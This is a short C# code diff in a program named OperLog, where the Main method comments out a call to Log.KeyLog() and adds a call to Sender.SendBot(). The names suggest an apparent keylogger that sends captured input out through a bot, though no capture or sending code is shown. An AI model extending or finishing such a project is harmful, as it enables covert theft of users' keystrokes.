@@ -11,7 +11,8 @@ namespace OperLog
         
         static void Main(String[] args)
         {
-            Log.KeyLog();
+           // Log.KeyLog();
+            Sender.SendBot();
         }
     }
 }
